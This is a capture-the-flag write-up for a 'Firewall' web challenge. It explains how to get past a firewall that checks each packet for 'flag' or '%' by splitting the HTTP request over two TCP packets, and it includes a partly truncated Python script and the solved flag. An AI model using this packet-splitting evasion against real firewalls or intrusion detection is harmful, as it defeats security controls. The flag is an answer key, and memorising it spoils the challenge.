# Challenge Name

Firewall

# Author

nullptr

# Description

Free flag at /flag.html

  `curl http://{{ IP }}:5000`

# Solution

To get the flag was that we need to traverse to /flag.html but there's a firewall that's built into the link that blocks anything that contains the string "flag" or "%". There's also another fact in that it checks each tcp packet for the string "flag" or "%" so trying to write it in hex was not going to cut it since when reconstructed it will see the word flag. So needed to break the packet into multiple pieces to get the flag. I broke it into 2 pieces then just went to get the flag.

````
import socket
import time
import re

HOST = "35.227.38.232"
PORT = 5000

FLAG_RE = re.compile(r"uoftctf\{[^}]+\}")

def recv_until(sock: socket.socket, marker: bytes, limit: int = 65536) -> bytes:
    """Receive until marker is found or timeout occurs."""
    data = b""
    while marker not in data and len(data) < limit:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

def parse_header(resp: bytes, name: bytes):
    # very small/simple header parser
    for line in resp.split(b"\r\n"):
        if line.lower().startswith(name.lower() + b":"):
            return line.split(b":", 1)[1].strip()
    return None

def parse_content_range(resp: bytes):
    m = re.search(rb"Content-Range:\s*bytes\s+(\d+)-(\d+)/(\d+)", resp)
    if not m:
        return None
    return tuple(int(x) for x in m.groups())

def http_request_split_range(range_header: bytes, timeout=0.7) -> bytes:
    """
    Send request as: 'GET /f' + 'lag.html ...' so 'flag' never appears in one packet.
    Read headers first, then read body by Content-Length to avoid hanging.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.settimeout(timeout)
    s.connect((HOST, PORT))

    p1 = b"GET /f"
    p2 = (
        b"lag.html HTTP/1.1\r\n"
        + f"Host: {HOST}:{PORT}\r\n".encode()
        + range_header
        + b"Connection: close\r\n\r\n"
    )

    s.send(p1)
    time.sleep(0.05)
    s.send(p2)

    try:
        # 1) Get headers quickly
        head = recv_until(s, b"\r\n\r\n")
        if b"\r\n\r\n" not in head:
            return head  # incomplete / timed out

        headers, rest = head.split(b"\r\n\r\n", 1)

        cl = parse_header(headers, b"Content-Length")
        if cl is None:
            # Fallback: just grab whatever remains until timeout
            data = rest
            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                except socket.timeout:
                    break
            return headers + b"\r\n\r\n" + data

        content_len = int(cl)
        body = rest
        # 2) Read exactly Content-Length bytes of body
        while len(body) < content_len:
            chunk = s.recv(4096)
            if not chunk:
                break
            body += chunk

        return headers + b"\r\n\r\n" + body[:content_len]
    finally:
        s.close()

def http_tail(n: int) -> bytes:
    return http_request_split_range(f"Range: bytes=-{n}\r\n".encode())

def http_range(start: int, end: int) -> bytes:
    return http_request_split_range(f"Range: bytes={start}-{end}\r\n".encode())

def extract_body(resp: bytes) -> str:
    parts = resp.split(b"\r\n\r\n", 1)
    if len(parts) != 2:
        return ""
    return parts[1].decode(errors="replace")
... (35 lines left)
````

# Flag

uoftctf{f1rew4l1_Is_nOT_par7icu11rLy_R0bust_I_bl4m3_3bpf}

# Solved By

Kazikiri
